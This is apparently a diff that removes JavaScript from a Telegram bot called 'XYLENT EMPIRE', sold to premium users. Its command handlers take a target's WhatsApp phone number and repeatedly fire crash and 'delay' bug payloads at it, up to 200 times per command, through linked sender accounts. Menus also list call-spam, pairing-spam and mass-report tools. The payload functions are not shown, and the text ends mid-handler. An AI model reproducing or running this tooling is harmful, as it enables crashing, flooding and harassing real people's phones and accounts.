-    clearInterval(buttonIntervals.get(messageId))
-    buttonIntervals.delete(messageId)
-
-  }
-
-
-  if (data.startsWith("color_")) {
-
-    const color = data.replace("color_","")
-
-    userButtonColor[userId] = color
-
-    await bot.answerCallbackQuery(query.id,{
-      text:"🎨 Warna dipilih"
-    })
-
-    await bot.deleteMessage(chatId,messageId).catch(()=>{})
-
-    await sendStartMenu(chatId, query.from)
-
-    return
-
-  }
-
-    await bot.deleteMessage(chatId,messageId).catch(()=>{})
-
-
-    let caption = ""
-    let replyMarkup = {}
-
-    if (data === "trashmenu") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu bugs
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : Bebas spam bugs & No Spam
-
-╔─═⊱ DELAY TYPE
-│/Trolling - 628xx
-│/Novaria - 628xx
-│/Nebula - 628xx
-│/Supernova - 628xx
-│/Ovalium - 628xx
-│/Slowness - 628xx
-│/Zombiee - 628xx
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-  inline_keyboard: [
-    [{ text: "Blank Type", callback_data: "blankbug", icon_custom_emoji_id: "6097881360112816903", style: "primary" }],
-    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "primary" }]],
-    };
-  }  
-
-    
-    else if (data === "blankbug") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ ⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : bebas spam bugs & no spam
-
-╔─═⊱ BLANK & SYSTEM UI TYPE
-│/Dior - 628xx
-│/Darkness - 628xx
-│/Xiosr - 628xx
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-  inline_keyboard: [
-    [{ text: "  Crash Type", callback_data: "crashbug", icon_custom_emoji_id: "6097881360112816903", style: "danger" }],
-    [{ text: "⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
-    };
-  }  
-
-    
-    else if (data === "crashbug") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : bebas spam bugs & no spam
-
-╔─═⊱ CRASH TYPE
-│/Catally - 628xx 
-│/Craryz - 628xx
-│/Crazzy - 628xx
-│/zombies - 628xx
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-  inline_keyboard: [
-    [{ text: "  Group Bug", callback_data: "groupbug", icon_custom_emoji_id: "6097881360112816903", style: "success" }],
-    [{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style: "success" }]],
-    };
-  }  
-
-    
-    else if (data === "groupbug") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : bebas spam bugs & no spam
-
-╔─═⊱ GROUP TYPE
-│/Cursed - 628xx
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-  inline_keyboard: [
-    [{ text: "  Test Function", callback_data: "tesfunc", icon_custom_emoji_id: "6097881360112816903", style: "primary" }],
-    [{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style: "primary" }]],
-    };
-  }  
-
-    
-    else if (data === "tesfunc") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : bebas spam bugs & no spam
-
-╔─═⊱ Tes Function 
-│/testfunc - 628xx 10
-│/testgb - linkgb  10
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
-      };
-    } 
-    
-    
-    else if (data === "developer_menu") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : Bebas spam bugs & No Spam
-
-<blockquote><strong>╔─═⊱ AKSES DEVELOPER</strong></blockquote>
-│/addowner 
-║/delowner 
-│/addadmin 
-║/deladmin 
-│/addprem 
-║/delprem
-│/setcd 
-║/addsender
-│/listbot
-┗━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-  inline_keyboard: [
-    [{ text: "  Owner Menu", callback_data: "owner_menu", icon_custom_emoji_id: "5084974483685507801", style: "danger" }],
-    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
-    };
-  }  
-    
-    else if (data === "owner_menu") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : Bebas spam bugs & No Spam
-
-<blockquote><strong>╔─═⊱ AKSES OWNER</strong></blockquote>
-│/addadmin
-║/deladmin
-│/addprem 
-║/delprem
-│/setcd 
-║/addsender
-│/listbot
-┗━━━━━━━━━━━━━━⬡
-`;
-  replyMarkup = {
-  inline_keyboard: [
-    [{ text: "  Admin Menu", callback_data: "Admin_menu", icon_custom_emoji_id: "5116582462276764538",  style: "danger" }],
-    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
-    };
-  }  
-    
-    else if (data === "Admin_menu") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
-      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
-⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
-⎔ type script : Bebas spam bugs & No Spam
-
-<blockquote><strong>╔─═⊱ AKSES ADMIN</strong></blockquote>
-│/addprem
-║/delprem
-│/setcd
-║/addsender
-│/listbot
-┗━━━━━━━━━━━━━━━⬡
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: "⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
-      };
-    } 
-    
-    else if (data === "tqto") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>
-╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> ─═⬡
-║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : Xyzen Official <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 :  Pinzy Official <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : saka <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Nexi <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Errstore <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Yanz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Vinz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-║⎔ 𝗢𝘄𝗻𝗲𝗿 : Palzz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : Takashi <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : Badzzne <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : AsepX7 <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
-┗━━━━━━━━━━━━━⬡</strong></blockquote>
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
-      };
-    } 
-      
-    else if (data === "buysc") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>
-╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐒͢𝐇͢𝐎͢𝐏 ─═⬡
-║
-║─── [ 𝗜𝗡𝗦𝗧𝗥𝗨𝗞𝗦𝗜 ] ───
-║
-║ Silahkan ketik perintah :
-║ ➥ /buysc
-║
-║ Untuk melakukan pembelian
-║ secara otomatis.
-║
-╚━━━━━━━━━━━━━⎔</strong></blockquote>
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", style : "primary" }]],
-      };
-    } 
-    
-    else if (data === "updatesc") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>
-╔═══〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕═══⎔
-║
-║  📢  𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘
-║
-║  Silahkan ketik perintah:
-║  ➥ <code>/updatesc</code>
-║  ➥ <code>/autoupdate (on/off)</code>
-║  ➥ <code>/checkupdate</code>
-║  ➥ <code>/updatestatus</code>
-║
-║  Proses pembaruan script
-║  akan berjalan otomatis.
-║
-╚═════════════════════⎔</strong></blockquote>
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", style : "primary" }]],
-      };
-    } 
-    
-    else if (data === "tols") {
-      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
-      caption = `<blockquote><strong>
-╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji>─═⬡
-║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @Pinnxzy<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
-║⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
-║⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
-║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
-┗━━━━━━━━━━━━━⬡</strong></blockquote>
-<blockquote><strong>╔─═⊱ TOOLS  MENU
-║/SpamPairing
-│/SpamCall
-║/hapusbug
-│checkerror
-│/SpamReportWhatsapp
-┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
-<blockquote><strong>╔─═⊱ FUN MENU
-│/tourl
-│/tofotolive
-│/cekemoji
-│/brat
-┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
-`;
-      replyMarkup = {
-        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
-      };
-    } 
-    
-    else if (data === "back_to_main") {
-      await sendStartMenu(chatId, query.from);
-      return await bot.answerCallbackQuery(query.id);
-    }
-
-    if (caption !== "" && selectedImage !== "") {
-      await bot.sendPhoto(chatId, selectedImage, {
-        caption: caption,
-        parse_mode: "HTML",
-        reply_markup: replyMarkup
-      });
-    }
-
-    await bot.answerCallbackQuery(query.id);
-});
-
-//=======CASE BUG=========//
-
-bot.onText(/\/Trolling(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Trolling 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Hard
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 200; i++) {
-          await X7Nganceng(sock, target, x = false);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Trolling ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Trolling error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Trolling ERROR:", err)
-  }
-});
-
-bot.onText(/\/Novaria(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Novaria 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Hard Invis
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 200; i++) {
-          await X7DelayHard(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Novaria ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Novaria error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Nebula ERROR:", err)
-  }
-});
-
-bot.onText(/\/Nebula(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Nebula 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Hard Invisible 
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 200; i++) {
-          await X7Delay(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Nebula ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Nebula error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Nebula ERROR:", err)
-  }
-});
-
-bot.onText(/\/Supernova(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Supernova 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Visible Hard 
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 5; i++) {
-          await delayvisible(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Supernova ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Supernova error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Supernova ERROR:", err)
-  }
-});
-
-bot.onText(/\/Ovalium(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Ovalium 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Sedot Kouta
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 100; i++) {
-          await dingleyhard(sock, target, ptcp = true);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Ovalium ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Ovalium error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Ovalium ERROR:", err)
-  }
-});
-
-bot.onText(/\/Slowness(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Slowness 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
